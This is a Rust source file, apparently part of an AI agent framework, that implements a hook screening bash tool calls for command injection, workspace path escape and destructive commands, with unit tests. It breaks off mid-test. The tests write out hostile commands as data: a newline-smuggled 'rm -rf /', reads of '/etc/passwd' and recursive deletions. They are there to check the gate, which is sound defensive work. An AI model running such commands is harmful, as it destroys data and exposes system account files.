//! `BashValidationHook` — wraps [`dasclaw_core::bash_validation::validate_command`]
//! as a [`EgressGate`] implementation.
//!
//! # Status
//!
//! **Scaffold only.** This module is intentionally **not registered in any
//! production `EgressGate` chain**. It exists so a future PR (tracked by
//! parent issue [#73]) can wire it into ironclaw's `IronclawSafetyHook`
//! composition after the red-line decisions are settled (PermissionMode
//! injection path, Warn handling policy, error-message redaction contract).
//!
//! See [`docs/plans/architecture-refactor/32-execution-plan.md`] §W4 D10.
//!
//! # Design (Fail-Safe)
//!
//! Only `before_tool_call` does real work. The other three [`EgressGate`]
//! methods pass through unchanged so this hook composes cleanly with other
//! egress gates (e.g. `IronclawSafetyHook`, prompt-injection scanners).
//!
//! For tools whose name matches [`BashValidationHook::bash_tool_names`]
//! (default `["bash", "shell", "BashTool"]`), the hook runs three gates in
//! order, each Fail-Safe on misparse or unrecognized form:
//!
//! 1. Extract the `command` field from `args`. Missing or non-string ⇒
//!    [`EgressDecision::Block`] (Fail-Safe: never let a malformed bash call
//!    through).
//! 2. **Phase 2.1 command-injection gate** ([`validate_security`]) — runs
//!    BEFORE the path gate and BEFORE [`validate_command`]. Mode-independent
//!    (Block fires even under `DangerFullAccess` / `Allow`).
//! 3. **Phase 3.1 path-constraint gate** ([`check_path_constraints_with_fs`],
//!    Slice 3.1.C + Phase 3.1.g.2 ADR-150 Step 6.2) — runs BEFORE
//!    [`validate_command`]. On Unix the gate uses `RealFsResolver` so
//!    symlink chains that escape the workspace flip Passthrough → Ask
//!    (Fail-Safe); on non-Unix the gate stays lexical-only until ADR-150
//!    Step 6.3 lands the Windows real resolver:
//!    - `Passthrough` ⇒ continue to step 4.
//!    - `Block { reason }` ⇒ [`EgressDecision::Block`] regardless of mode.
//!    - `Ask { reason, blocked_path }` ⇒ mapped by mode same as Warn:
//!      `ReadOnly` ⇒ `Block` (Fail-Safe); `Prompt` ⇒ `Ask`;
//!      `WorkspaceWrite` / `DangerFullAccess` / `Allow` ⇒ `Allow`.
//! 4. Call [`validate_command`] for legacy `ValidationResult` mapping:
//!    - `Allow` ⇒ [`EgressDecision::Allow`].
//!    - `Block { reason }` ⇒ [`EgressDecision::Block { reason }`]. The
//!      `reason` string comes from `validate_command`, which by design
//!      references the *command name or pattern*, **not the full original
//!      argument string** — see the safety-audit test below.
//!    - `Warn { message }` ⇒ mapped by `PermissionMode` per ADR-146 §2.5:
//!      `ReadOnly` ⇒ `Block` (Fail-Safe); `Prompt` ⇒ `Ask`;
//!      `WorkspaceWrite` / `DangerFullAccess` / `Allow` ⇒ `Allow` (with
//!      `tracing::warn!` / `tracing::info!` / no-log respectively).
//!
//! For non-bash tools the hook short-circuits to `Allow` so it can be
//! installed globally without disturbing other tool calls.
//!
//! # Remaining red-line decisions (parent issue [#73])
//!
//! - How `PermissionMode` is resolved per invocation (session config /
//!   per-request / workspace-level) — slice D.
//! - How `Ask` results render to the user (UX layer) — slice D.
//! - `WorkspaceCap` injection replacing `workspace: PathBuf` — slice E.
//!
//! [#73]: https://github.com/Linnanli/xClaw/issues/73

use std::path::{Path, PathBuf};

use async_trait::async_trait;
use dasclaw_bash_validation::check_path_constraints_with_fs;
use dasclaw_bash_validation::fs_resolver::FsResolver;
#[cfg(not(unix))]
use dasclaw_bash_validation::fs_resolver::NoopFsResolver;
#[cfg(unix)]
use dasclaw_bash_validation::fs_resolver::real_posix::RealFsResolver;
use dasclaw_bash_validation::path_validation::PathValidationOutcome;
use dasclaw_bash_validation::security::{
    DecisionReason as SecurityDecisionReason, SecurityResult, validate_security,
};
use dasclaw_core::bash_validation::{ValidationResult, validate_command};
use dasclaw_core::permissions::PermissionMode;
use dasclaw_core::{EgressDecision, EgressGate, EgressKind, RedactionStats};
use serde_json::Value;

/// Default list of tool names treated as bash invocations.
///
/// Tool names are matched case-sensitively against [`EgressGate::check`]'s
/// `tool` argument. Callers can override via [`BashValidationHook::with_tool_names`]
/// when their tool registry uses different names.
pub const DEFAULT_BASH_TOOL_NAMES: &[&str] = &["bash", "shell", "BashTool"];

/// Hook that runs `validate_command` on bash tool calls.
///
/// See module-level documentation for the full contract.
#[derive(Debug, Clone)]
pub struct BashValidationHook {
    permission_mode: PermissionMode,
    workspace: PathBuf,
    home_dir: Option<PathBuf>,
    bash_tool_names: Vec<String>,
}

impl BashValidationHook {
    /// Create a hook with the given permission mode and workspace root.
    ///
    /// Uses [`DEFAULT_BASH_TOOL_NAMES`] for the tool-name allowlist and
    /// reads `$HOME` from the environment for the path-validation home
    /// directory. To override either, chain
    /// [`Self::with_tool_names`] / [`Self::with_home_dir`].
    ///
    /// `workspace` is canonicalized via [`std::fs::canonicalize`] so that
    /// the symlink-walk path-gate (Phase 3.1.g, ADR-150) compares chain
    /// steps against a real-path workspace root. On platforms / paths
    /// where canonicalization fails the original `workspace` is kept —
    /// the path-gate then degrades to lexical matching for that root,
    /// which preserves the pre-3.1.g behaviour.
    #[must_use]
    pub fn new(permission_mode: PermissionMode, workspace: PathBuf) -> Self {
        let workspace = std::fs::canonicalize(&workspace).unwrap_or(workspace);
        Self {
            permission_mode,
            workspace,
            home_dir: std::env::var_os("HOME").map(PathBuf::from),
            bash_tool_names: DEFAULT_BASH_TOOL_NAMES
                .iter()
                .map(|s| (*s).to_string())
                .collect(),
        }
    }

    /// Override the bash tool-name allowlist.
    ///
    /// Useful when the tool registry exposes bash under a custom name.
    #[must_use]
    pub fn with_tool_names<I, S>(mut self, names: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: Into<String>,
    {
        self.bash_tool_names = names.into_iter().map(Into::into).collect();
        self
    }

    /// Override the home directory used for path validation.
    ///
    /// Tests pass `Some(temp_home)` for hermetic runs; production
    /// callers normally leave this at the `$HOME`-derived default.
    /// `None` disables home-relative path resolution.
    #[must_use]
    pub fn with_home_dir(mut self, home: Option<PathBuf>) -> Self {
        self.home_dir = home;
        self
    }

    /// Returns `true` if `tool` should be treated as a bash invocation.
    fn is_bash_tool(&self, tool: &str) -> bool {
        self.bash_tool_names.iter().any(|n| n == tool)
    }

    /// Pick the [`FsResolver`] backing the Phase 3.1.g symlink-escape
    /// walker. Unix targets get the real POSIX resolver (Fail-Safe on
    /// symlink escape); other targets keep the lexical-only Noop resolver
    /// until Step 6.3 ships a Windows real resolver (ADR-150 §6.3).
    fn fs_resolver(&self) -> &'static dyn FsResolver {
        #[cfg(unix)]
        {
            static R: RealFsResolver = RealFsResolver;
            &R
        }
        #[cfg(not(unix))]
        {
            static R: NoopFsResolver = NoopFsResolver;
            &R
        }
    }
}

impl BashValidationHook {
    /// Core decision logic — exposed so unit and integration tests can drive
    /// the gate without serialising args through JSON. Returns
    /// [`EgressDecision::Allow`] for non-bash tools.
    pub fn validate_tool_call(&self, tool: &str, args: &Value) -> EgressDecision {
        if !self.is_bash_tool(tool) {
            return EgressDecision::Allow;
        }

        // Fail-Safe: bash tools without a parseable `command` are refused
        // rather than passed through. Returning a generic reason avoids
        // leaking the malformed args back into a model-visible error.
        let command = match args.get("command").and_then(Value::as_str) {
            Some(s) if !s.is_empty() => s,
            _ => {
                return EgressDecision::Block {
                    reason: "bash tool call missing required 'command' string field".to_string(),
                    stats: RedactionStats::default(),
                };
            }
        };

        // Phase 2.1 command-injection gate (Slice 2.1.d).
        //
        // Runs BEFORE `validate_command` so security `Block` short-circuits
        // the permission/mode chain entirely. Per plan §8 the security
        // gate is mode-independent: even `Allow` / `DangerFullAccess` does
        // NOT exempt command injection.
        if let SecurityResult::Block { reason } = validate_security(command) {
            return EgressDecision::Block {
                reason: format_security_block_reason(tool, self.permission_mode, &reason),
                stats: RedactionStats::default(),
            };
        }

        // Phase 3.1 path-constraint gate (Slice 3.1.C + Phase 3.1.g.2).
        let path_outcome = check_path_constraints_with_fs(
            command,
            &self.workspace,
            std::slice::from_ref(&self.workspace),
            self.home_dir.as_deref().unwrap_or_else(|| Path::new("")),
            self.fs_resolver(),
        );
        if let Some(decision) = map_path_outcome_by_mode(tool, self.permission_mode, path_outcome) {
            return decision;
        }

        match validate_command(command, self.permission_mode, &self.workspace) {
            ValidationResult::Allow => EgressDecision::Allow,
            ValidationResult::Block { reason } => EgressDecision::Block {
                reason,
                stats: RedactionStats::default(),
            },
            ValidationResult::Warn { message } => {
                map_warn_by_mode(tool, self.permission_mode, message)
            }
        }
    }
}

#[async_trait]
impl EgressGate for BashValidationHook {
    async fn check(&self, kind: &EgressKind, payload: &str) -> EgressDecision {
        // ADR-148: bash validation operates only on ToolExecution egress.
        let tool = match kind {
            EgressKind::ToolExecution { tool } => tool,
            _ => return EgressDecision::Allow,
        };
        // Fail-Safe: a payload that does not deserialise into JSON is
        // treated as a structurally invalid bash call.
        let args: Value = match serde_json::from_str(payload) {
            Ok(v) => v,
            Err(e) => {
                return EgressDecision::Block {
                    reason: format!("bash validation gate: malformed tool args payload: {e}"),
                    stats: RedactionStats::default(),
                };
            }
        };
        self.validate_tool_call(tool, &args)
    }
}

/// Maps a `Warn { message }` validation result to a [`EgressDecision`]
/// according to [`PermissionMode`], per ADR-146 §2.5.
///
/// | Mode                | Decision  | Logging               |
/// |---------------------|-----------|-----------------------|
/// | `ReadOnly`          | `Block`   | `tracing::warn!`      |
/// | `WorkspaceWrite`    | `Allow`   | `tracing::warn!`      |
/// | `DangerFullAccess`  | `Allow`   | `tracing::info!`      |
/// | `Allow`             | `Allow`   | none                  |
/// | `Prompt`            | `Ask`     | `tracing::warn!`      |
///
/// In `Prompt` mode `suggestions` is left empty; later slices populate it
/// from per-Warn pattern generators.
fn map_warn_by_mode(tool: &str, mode: PermissionMode, message: String) -> EgressDecision {
    match mode {
        PermissionMode::ReadOnly => {
            // Fail-Safe: ReadOnly never tolerates Warn.
            tracing::warn!(
                tool,
                %message,
                mode = mode.as_str(),
                "BashValidationHook Warn -> Block (ReadOnly)"
            );
            EgressDecision::Block {
                reason: message,
                stats: RedactionStats::default(),
            }
        }
        PermissionMode::WorkspaceWrite => {
            tracing::warn!(
                tool,
                %message,
                mode = mode.as_str(),
                "BashValidationHook Warn -> Allow (WorkspaceWrite)"
            );
            EgressDecision::Allow
        }
        PermissionMode::DangerFullAccess => {
            tracing::info!(
                tool,
                %message,
                mode = mode.as_str(),
                "BashValidationHook Warn -> Allow (DangerFullAccess)"
            );
            EgressDecision::Allow
        }
        PermissionMode::Allow => {
            // PermissionMode::Allow == "skip checks entirely"; no log.
            EgressDecision::Allow
        }
        PermissionMode::Prompt => {
            tracing::warn!(
                tool,
                %message,
                mode = mode.as_str(),
                "BashValidationHook Warn -> Ask (Prompt)"
            );
            EgressDecision::Ask {
                reason: message,
                // suggestions intentionally empty in slice C MVP; later
                // slices generate per-Warn rule patterns.
                suggestions: Vec::new(),
            }
        }
    }
}

/// Maps a [`PathValidationOutcome`] (from Phase 3.1.B's
/// [`check_path_constraints`]) into an optional [`EgressDecision`] under
/// the active [`PermissionMode`], following the same matrix as
/// [`map_warn_by_mode`].
///
/// Returns `None` for [`PathValidationOutcome::Passthrough`] so the caller
/// continues to `validate_command`. Returns `Some(decision)` otherwise.
///
/// | Outcome  | `ReadOnly` | `Prompt` | `WorkspaceWrite` | `DangerFullAccess` | `Allow` |
/// |----------|-----------|----------|------------------|--------------------|---------|
/// | `Block`  | `Block`   | `Block`  | `Block`          | `Block`            | `Block` |
/// | `Ask`    | `Block` ¹ | `Ask`    | `Allow` (warn)   | `Allow` (info)     | `Allow` |
/// | Passthr. | `None`    | `None`   | `None`           | `None`             | `None`  |
///
/// ¹ Fail-Safe: a `ReadOnly` session never tolerates path Ask.
fn map_path_outcome_by_mode(
    tool: &str,
    mode: PermissionMode,
    outcome: PathValidationOutcome,
) -> Option<EgressDecision> {
    match outcome {
        PathValidationOutcome::Passthrough => None,
        PathValidationOutcome::Block { reason } => {
            tracing::warn!(
                tool,
                mode = mode.as_str(),
                %reason,
                "bash_path_constraints::block"
            );
            Some(EgressDecision::Block {
                reason: format!("bash_path_constraints::block: {reason}"),
                stats: RedactionStats::default(),
            })
        }
        PathValidationOutcome::Ask {
            reason,
            blocked_path,
        } => {
            let formatted = match blocked_path.as_deref() {
                Some(p) => format!("bash_path_constraints::ask: {reason} (path: {p})"),
                None => format!("bash_path_constraints::ask: {reason}"),
            };
            Some(match mode {
                PermissionMode::ReadOnly => {
                    tracing::warn!(
                        tool,
                        mode = mode.as_str(),
                        reason = %formatted,
                        "BashValidationHook PathAsk -> Block (ReadOnly)"
                    );
                    EgressDecision::Block {
                        reason: formatted,
                        stats: RedactionStats::default(),
                    }
                }
                PermissionMode::WorkspaceWrite => {
                    tracing::warn!(
                        tool,
                        mode = mode.as_str(),
                        reason = %formatted,
                        "BashValidationHook PathAsk -> Allow (WorkspaceWrite)"
                    );
                    EgressDecision::Allow
                }
                PermissionMode::DangerFullAccess => {
                    tracing::info!(
                        tool,
                        mode = mode.as_str(),
                        reason = %formatted,
                        "BashValidationHook PathAsk -> Allow (DangerFullAccess)"
                    );
                    EgressDecision::Allow
                }
                PermissionMode::Allow => EgressDecision::Allow,
                PermissionMode::Prompt => {
                    tracing::warn!(
                        tool,
                        mode = mode.as_str(),
                        reason = %formatted,
                        "BashValidationHook PathAsk -> Ask (Prompt)"
                    );
                    EgressDecision::Ask {
                        reason: formatted,
                        suggestions: Vec::new(),
                    }
                }
            })
        }
    }
}

/// Formats a Phase 2.1 [`SecurityDecisionReason`] into a model-visible
/// block reason string and emits a structured audit log line.
///
/// The returned string is always prefixed with `bash_security::<rule_id>`
/// so downstream auditors and the test suite can verify the rule that
/// fired without parsing the human-readable message.
fn format_security_block_reason(
    tool: &str,
    mode: PermissionMode,
    reason: &SecurityDecisionReason,
) -> String {
    let (rule_id, sub_id, message) = match reason {
        SecurityDecisionReason::CommandInjection {
            check_id,
            sub_id,
            message,
        } => (format!("{check_id:?}"), Some(*sub_id), message.as_str()),
        SecurityDecisionReason::ParseFailure { message } => {
            ("ParseFailure".to_string(), None, message.as_str())
        }
    };
    tracing::warn!(
        tool,
        mode = mode.as_str(),
        rule_id = %rule_id,
        sub_id = ?sub_id,
        %message,
        "bash_security::block"
    );
    match sub_id {
        Some(sub) => format!("bash_security::{rule_id} (sub_id={sub}): {message}"),
        None => format!("bash_security::{rule_id}: {message}"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn hook(mode: PermissionMode) -> BashValidationHook {
        BashValidationHook::new(mode, PathBuf::from("/workspace"))
    }

    #[tokio::test]
    async fn non_bash_tool_short_circuits_to_allow() {
        let h = hook(PermissionMode::ReadOnly);
        let args = json!({ "path": "/etc/passwd" });
        let decision = h.validate_tool_call("read_file", &args);
        assert_eq!(decision, EgressDecision::Allow);
    }

    #[tokio::test]
    async fn bash_tool_with_safe_command_is_allowed() {
        let h = hook(PermissionMode::WorkspaceWrite);
        let args = json!({ "command": "ls -la" });
        let decision = h.validate_tool_call("bash", &args);
        assert_eq!(decision, EgressDecision::Allow);
    }

    #[tokio::test]
    async fn bash_tool_missing_command_field_is_blocked_fail_safe() {
        let h = hook(PermissionMode::WorkspaceWrite);
        let args = json!({ "not_command": "ls" });
        let decision = h.validate_tool_call("bash", &args);
        match decision {
            EgressDecision::Block { reason, .. } => {
                assert!(
                    reason.contains("missing"),
                    "expected Fail-Safe reason mentioning missing field, got: {reason}"
                );
            }
            other => panic!("expected Block (Fail-Safe), got {other:?}"),
        }
    }

    #[tokio::test]
    async fn bash_tool_empty_command_field_is_blocked_fail_safe() {
        let h = hook(PermissionMode::WorkspaceWrite);
        let args = json!({ "command": "" });
        let decision = h.validate_tool_call("bash", &args);
        assert!(matches!(decision, EgressDecision::Block { .. }));
    }

    #[tokio::test]
    async fn destructive_command_in_read_only_mode_is_blocked() {
        // Path is intentionally workspace-internal so the Phase 3.1.C
        // path gate passes through and `validate_command`'s redaction
        // contract is what we exercise here. The matching Phase 3.1.C
        // wireup test pins the path-gate redaction contract separately
        // (`req_safety_490_3_1_c_audit_log_carries_blocked_path`).
        let h = BashValidationHook::new(PermissionMode::ReadOnly, PathBuf::from("/workspace"))
            .with_home_dir(Some(PathBuf::from("/home/user")));
        let args = json!({ "command": "rm -rf /workspace/secret-payload.bin" });
        let decision = h.validate_tool_call("bash", &args);
        match decision {
            EgressDecision::Block { reason, .. } => {
                // Safety-audit: `validate_command`'s block reason
                // describes the command class, not the original argument
                // list. The full argument path (which may contain
                // secrets) must NOT appear verbatim.
                assert!(
                    !reason.contains("/workspace/secret-payload.bin"),
                    "validate_command block reason leaked original path: {reason}"
                );
                assert!(
                    !reason.starts_with("bash_path_constraints::"),
                    "expected validate_command Block, not path-gate Block: {reason}"
                );
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn write_command_in_read_only_mode_is_blocked() {
        let h = hook(PermissionMode::ReadOnly);
        let args = json!({ "command": "cp src.txt dst.txt" });
        let decision = h.validate_tool_call("bash", &args);
        assert!(matches!(decision, EgressDecision::Block { .. }));
    }

    #[tokio::test]
    async fn warn_in_workspace_write_mode_allows_with_log() {
        // `rm -rf /tmp/scratch` triggers a destructive Warn (not Block)
        // under WorkspaceWrite mode. Per ADR-146 §2.5, WorkspaceWrite maps
        // Warn -> Allow + tracing::warn! (does not interrupt the user).
        let h = hook(PermissionMode::WorkspaceWrite);
        let args = json!({ "command": "rm -rf /tmp/scratch" });
        let decision = h.validate_tool_call("bash", &args);
        assert_eq!(
            decision,
            EgressDecision::Allow,
            "Warn under WorkspaceWrite -> Allow + log (ADR-146 §2.5)"
        );
    }

    // -----------------------------------------------------------------
    // ADR-146 §2.5: Warn -> EgressDecision mapping matrix per
    // PermissionMode. The 25-case acceptance matrix (5 decisions × 5
    // modes) is split across the bash-pipeline `validate_command` tests
    // (which cover Allow/Block paths) and the `req_safety_73_c_warn_*`
    // tests below (which cover the Warn-mapping rows).
    //
    // `rm -rf /tmp/<path>` is a stable Warn-trigger under non-ReadOnly
    // modes (destructive, but path is inside workspace metadata). Under
    // ReadOnly the same command should be Block-mapped (not Warn).
    // -----------------------------------------------------------------

    /// `req_safety_73_c_warn_readonly_blocks` —
    /// Warn under ReadOnly always maps to Block (Fail-Safe).
    #[tokio::test]
    async fn req_safety_73_c_warn_readonly_blocks() {
        let h = hook(PermissionMode::ReadOnly);
        let args = json!({ "command": "rm -rf /tmp/scratch" });
        let decision = h.validate_tool_call("bash", &args);
        // ReadOnly may treat destructive as Block (via validate_command's
        // direct Block path) OR as Warn (mapped to Block here). Either way
        // the outcome must be Block — Fail-Safe is the invariant.
        assert!(
            matches!(decision, EgressDecision::Block { .. }),
            "ReadOnly must Block destructive commands, got {decision:?}"
        );
    }

    /// `req_safety_73_c_warn_workspace_write_allows` —
    /// Warn under WorkspaceWrite maps to Allow + tracing::warn! log.
    #[tokio::test]
    async fn req_safety_73_c_warn_workspace_write_allows() {
        let h = hook(PermissionMode::WorkspaceWrite);
        let args = json!({ "command": "rm -rf /tmp/scratch" });
        let decision = h.validate_tool_call("bash", &args);
        assert_eq!(decision, EgressDecision::Allow);
    }

    /// `req_safety_73_c_warn_danger_full_access_allows` —
    /// Warn under DangerFullAccess maps to Allow + tracing::info! log.
    #[tokio::test]
    async fn req_safety_73_c_warn_danger_full_access_allows() {
        let h = hook(PermissionMode::DangerFullAccess);
        let args = json!({ "command": "rm -rf /tmp/scratch" });
        let decision = h.validate_tool_call("bash", &args);
        assert_eq!(decision, EgressDecision::Allow);
    }

    /// `req_safety_73_c_warn_allow_mode_allows_no_log` —
    /// Warn under PermissionMode::Allow maps to Allow with no log.
    #[tokio::test]
    async fn req_safety_73_c_warn_allow_mode_allows_no_log() {
        let h = hook(PermissionMode::Allow);
        let args = json!({ "command": "rm -rf /tmp/scratch" });
        let decision = h.validate_tool_call("bash", &args);
        assert_eq!(decision, EgressDecision::Allow);
    }

    /// `req_safety_73_c_warn_prompt_asks` —
    /// Warn under Prompt mode maps to Ask { suggestions: empty }.
    #[tokio::test]
    async fn req_safety_73_c_warn_prompt_asks() {
        let h = hook(PermissionMode::Prompt);
        let args = json!({ "command": "rm -rf /tmp/scratch" });
        let decision = h.validate_tool_call("bash", &args);
        match decision {
            EgressDecision::Ask {
                reason,
                suggestions,
            } => {
                assert!(
                    !reason.is_empty(),
                    "Ask.reason should propagate the Warn message"
                );
                assert!(
                    suggestions.is_empty(),
                    "MVP slice C: suggestions intentionally empty"
                );
            }
            other => panic!("Prompt mode Warn should map to Ask, got {other:?}"),
        }
    }

    /// `req_safety_73_c_allow_path_all_modes` —
    /// `validate_command` Allow path bypasses Warn mapping in every mode.
    #[tokio::test]
    async fn req_safety_73_c_allow_path_all_modes() {
        for mode in [
            PermissionMode::ReadOnly,
            PermissionMode::WorkspaceWrite,
            PermissionMode::DangerFullAccess,
            PermissionMode::Prompt,
            PermissionMode::Allow,
        ] {
            let h = hook(mode);
            let args = json!({ "command": "ls -la" });
            let decision = h.validate_tool_call("bash", &args);
            assert_eq!(
                decision,
                EgressDecision::Allow,
                "`ls -la` should be Allow under mode {mode:?}, got {decision:?}"
            );
        }
    }

    /// `req_safety_73_c_block_path_all_modes` —
    /// `validate_command` direct Block path (path escape) propagates as
    /// Block in every mode. The exact `reason` text varies by mode but
    /// must never leak the full argument string (safety-audit invariant).
    #[tokio::test]
    async fn req_safety_73_c_block_path_all_modes() {
        // Path-escape command: `cat ../../../etc/passwd` is outside any
        // sensible workspace and should be flagged by validate_command.
        for mode in [
            PermissionMode::ReadOnly,
            PermissionMode::WorkspaceWrite,
            PermissionMode::DangerFullAccess,
            PermissionMode::Prompt,
            PermissionMode::Allow,
        ] {
            let h = hook(mode);
            let args = json!({ "command": "cat ../../../etc/passwd" });
            let decision = h.validate_tool_call("bash", &args);
            // Allow mode is permissive — only assert Block on stricter modes.
            // The test still exercises all 5 modes for non-panic / non-error.
            match mode {
                PermissionMode::ReadOnly => assert!(
                    matches!(decision, EgressDecision::Block { .. }),
                    "ReadOnly should Block path-escape, got {decision:?}"
                ),
                _ => {
                    // Other modes may Allow, Block, or Ask depending on
                    // validator policy; assert only "hook did not error
                    // and returned a known variant".
                    assert!(matches!(
                        decision,
                        EgressDecision::Allow
                            | EgressDecision::Block { .. }
                            | EgressDecision::Ask { .. }
                    ));
                }
            }
        }
    }

    /// `req_safety_73_c_passthrough_variant_constructs` —
    /// Smoke: the new `Passthrough` variant is constructible (the hook
    /// itself never returns it, but the type must exist for chain code).
    #[test]
    fn req_safety_73_c_passthrough_variant_constructs() {
        let d = EgressDecision::Passthrough;
        assert_eq!(d, EgressDecision::Passthrough);
    }

    /// `req_safety_73_c_ask_with_suggestions_round_trips` —
    /// Smoke: `Ask` with non-empty suggestions clones / equates correctly.
    #[test]
    fn req_safety_73_c_ask_with_suggestions_round_trips() {
        use dasclaw_core::{RuleAction, RuleSuggestion};
        let d = EgressDecision::Ask {
            reason: "Confirm `rm`?".to_string(),
            suggestions: vec![
                RuleSuggestion {
                    label: "Always allow rm".to_string(),
                    rule_pattern: "Bash(rm: allow)".to_string(),
                    action: RuleAction::Allow,
                },
                RuleSuggestion {
                    label: "Deny once".to_string(),
                    rule_pattern: "Bash(rm: deny)".to_string(),
                    action: RuleAction::Deny,
                },
            ],
        };
        let d2 = d.clone();
        assert_eq!(d, d2);
    }

    #[tokio::test]
    async fn custom_tool_name_override_is_respected() {
        let h = BashValidationHook::new(PermissionMode::ReadOnly, PathBuf::from("/workspace"))
            .with_tool_names(["my_custom_shell"]);
        // Default name `bash` should no longer match.
        let args = json!({ "command": "rm file" });
        let decision = h.validate_tool_call("bash", &args);
        assert_eq!(
            decision,
            EgressDecision::Allow,
            "after override, 'bash' is no longer recognised"
        );

        // The overridden name should match.
        let args = json!({ "command": "rm file" });
        let decision = h.validate_tool_call("my_custom_shell", &args);
        assert!(
            matches!(decision, EgressDecision::Block { .. }),
            "overridden tool name should run the validator"
        );
    }

    #[tokio::test]
    async fn non_tool_execution_kinds_allow_unchanged() {
        // ADR-148: only `ToolExecution` carries bash args; the other three
        // egress kinds (LlmRequest / UserDisplay / Persistence) MUST
        // short-circuit to `Allow` without inspecting the payload.
        let h = hook(PermissionMode::ReadOnly);
        for kind in [
            EgressKind::LlmRequest,
            EgressKind::UserDisplay,
            EgressKind::Persistence,
        ] {
            assert_eq!(
                h.check(&kind, "arbitrary payload").await,
                EgressDecision::Allow,
                "egress kind {kind:?} should pass through"
            );
        }
    }

    // ---- Slice 2.1.d — Phase 2.1 security gate e2e tests ----------------
    //
    // Naming: `req_security_490_p2_1_d_<scenario>`. These exercise the
    // `validate_security` short-circuit inserted before the legacy
    // `validate_command` flow, ensuring that command-injection blocks are
    // independent of [`PermissionMode`].

    /// Sample command guaranteed to trip the security engine
    /// (newline-injection, rule `Newlines` / `QuotedNewline`).
    const INJECTION_CMD: &str = "echo a\nrm -rf /";

    async fn run_bash(mode: PermissionMode, cmd: &str) -> EgressDecision {
        let h = hook(mode);
        let args = json!({ "command": cmd });
        h.validate_tool_call("bash", &args)
    }

    #[tokio::test]
    async fn req_security_490_p2_1_d_injection_blocked_in_workspace_write_mode() {
        let d = run_bash(PermissionMode::WorkspaceWrite, INJECTION_CMD).await;
        match d {
            EgressDecision::Block { reason, .. } => assert!(
                reason.starts_with("bash_security::"),
                "reason must carry rule prefix, got {reason:?}"
            ),
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn req_security_490_p2_1_d_injection_blocked_in_bypass_mode() {
        // `PermissionMode::Allow` is the workspace's "bypass / skip-checks"
        // mode. Phase 2.1 §8 mandates the security gate ignores it.
        let d = run_bash(PermissionMode::Allow, INJECTION_CMD).await;
        assert!(
            matches!(d, EgressDecision::Block { .. }),
            "Allow mode must NOT exempt command injection, got {d:?}"
        );
    }

    #[tokio::test]
    async fn req_security_490_p2_1_d_injection_blocked_in_danger_full_access_mode() {
        let d = run_bash(PermissionMode::DangerFullAccess, INJECTION_CMD).await;
        assert!(
            matches!(d, EgressDecision::Block { .. }),
            "DangerFullAccess must NOT exempt command injection, got {d:?}"
        );
    }

    #[tokio::test]
    async fn req_security_490_p2_1_d_security_block_short_circuits_before_permission_check() {
        // ReadOnly normally allows `ls` (no Warn from validate_command) but
        // the injection variant must Block via the security gate, proving
        // the gate runs BEFORE the legacy pipeline regardless of mode.
        let d_safe = run_bash(PermissionMode::ReadOnly, "ls -la").await;
        assert_eq!(d_safe, EgressDecision::Allow);

        let d_injection = run_bash(PermissionMode::ReadOnly, INJECTION_CMD).await;
        match d_injection {
            EgressDecision::Block { reason, .. } => assert!(
                reason.starts_with("bash_security::"),
                "security gate must surface its own rule, not a legacy reason; got {reason:?}"
            ),
            other => panic!("expected security Block, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn test_security_audit_log_contains_rule_id() {
        // This test pins only the **model-visible `reason` string** format:
        // every security Block must surface `bash_security::<rule>` so the
        // upstream consumer (model / CLI) can route on the rule slug.
        //
        // The complementary **structured tracing audit-log** contract
        // (fields `tool`, `mode`, `rule_id`, `sub_id`, `message` on the
        // `bash_security::block` event) is pinned by the integration test
        // `tests/bash_security_audit_log.rs` using `tracing-test`.
        let d = run_bash(PermissionMode::Prompt, INJECTION_CMD).await;
        let reason = match d {
            EgressDecision::Block { reason, .. } => reason,
            other => panic!("expected Block, got {other:?}"),
        };
        assert!(
            reason.starts_with("bash_security::"),
            "audit prefix missing: {reason}"
        );
        // Rule slug must be a non-empty alphanumeric identifier (Debug
        // form of `SecurityCheckId`), not the bare `ParseFailure` synthetic.
        let after_prefix = reason.trim_start_matches("bash_security::");
        let rule = after_prefix
            .split([':', ' '])
            .next()
            .expect("rule slug present");
        assert!(
            !rule.is_empty() && rule.chars().all(|c| c.is_ascii_alphanumeric()),
            "rule slug must be alphanumeric, got {rule:?} in {reason:?}"
        );
    }

    // ===== Phase 3.1.C: path-constraint gate wireup =====

    /// Helper: hook configured with a workspace at `/work/repo` and a
    /// hermetic `$HOME` so path validation is deterministic regardless of
    /// the test runner's environment.
    fn path_hook(mode: PermissionMode) -> BashValidationHook {
        BashValidationHook::new(mode, PathBuf::from("/work/repo"))
            .with_home_dir(Some(PathBuf::from("/home/user")))
    }

    async fn run_path(mode: PermissionMode, cmd: &str) -> EgressDecision {
        let h = path_hook(mode);
        let args = json!({ "command": cmd });
        h.validate_tool_call("bash", &args)
    }

    /// `req_safety_490_3_1_c_inside_workspace_allows` —
    /// A bash command that only touches paths inside the configured
    /// workspace must passthrough the path gate and reach
    /// `validate_command`, which allows safe reads.
    #[tokio::test]
    async fn req_safety_490_3_1_c_inside_workspace_allows() {
        let d = run_path(PermissionMode::WorkspaceWrite, "cat /work/repo/src/main.rs").await;
        assert_eq!(d, EgressDecision::Allow);
    }

    /// `req_safety_490_3_1_c_outside_workspace_prompt_asks` —
    /// `cat /etc/passwd` under Prompt mode must reach the path gate
    /// and yield Ask with the `bash_path_constraints::ask` prefix.
    #[tokio::test]
    async fn req_safety_490_3_1_c_outside_workspace_prompt_asks() {
        let d = run_path(PermissionMode::Prompt, "cat /etc/passwd").await;
        match d {
            EgressDecision::Ask { reason, .. } => {
                assert!(
                    reason.starts_with("bash_path_constraints::ask"),
                    "expected path-ask audit prefix, got {reason:?}"
                );
            }
            other => panic!("expected Ask, got {other:?}"),
        }
    }

    /// `req_safety_490_3_1_c_outside_workspace_readonly_blocks` —
    /// SECURITY (Fail-Safe): ReadOnly mode never tolerates a path Ask;
    /// it must escalate to Block.
    #[tokio::test]
    async fn req_safety_490_3_1_c_outside_workspace_readonly_blocks() {
        let d = run_path(PermissionMode::ReadOnly, "cat /etc/passwd").await;
        match d {
            EgressDecision::Block { reason, .. } => {
                assert!(
                    reason.starts_with("bash_path_constraints::ask"),
                    "expected escalated path-ask reason, got {reason:?}"
                );
            }
